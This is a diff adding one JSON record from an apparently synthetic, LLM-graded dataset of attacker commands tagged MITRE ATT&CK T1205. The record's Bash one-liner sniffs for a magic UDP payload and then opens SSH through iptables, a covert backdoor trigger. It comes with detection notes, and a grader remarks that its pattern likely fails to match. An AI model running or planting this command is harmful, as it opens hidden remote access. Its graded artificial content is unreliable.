@@ -1,0 +1,39 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "stdbuf -oL tcpdump -i eth0 -n -l -X 'udp and dst port 53413' | grep -m1 -i \"de ad be ef de ad be ef\" >/dev/null && iptables -I INPUT -p tcp --dport 22 -j ACCEPT",
+  "explanation": "Passively sniffs for a specific magic UDP payload pattern using tcpdump; upon detection, inserts an iptables rule to open SSH. Requires root for both tcpdump on some interfaces and iptables; use sudo if not root. Detection: monitor for tcpdump processes running persistently and alert on unauthorized iptables changes coincident with unusual UDP payloads.",
+  "rationale_steps": [
+    "Use tcpdump to capture UDP port 53413 with hex dump.",
+    "Pattern-match the magic bytes (de ad be ef ...).",
+    "On first match, programmatically open TCP/22 in firewall.",
+    "Acts as a covert activation signal without an open control port.",
+    "Detection: audit iptables changes; EDR for tcpdump long-lived sessions; NIDS for unusual constant UDP port traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-9c13d104-54afe709",
+  "source_prompt_hash": "9c13d104",
+  "timestamp_utc": "2025-09-30T05:40:25.546732Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command uses balanced quoting, valid flags, proper piping, redirection, and command chaining with no apparent syntax errors.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly implements traffic signaling by sniffing for a magic UDP payload and, on match, modifying iptables to open SSH, but the grep hex pattern likely won't match tcpdump -X output formatting and it requires elevated privileges to work.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T19:29:37.562956Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
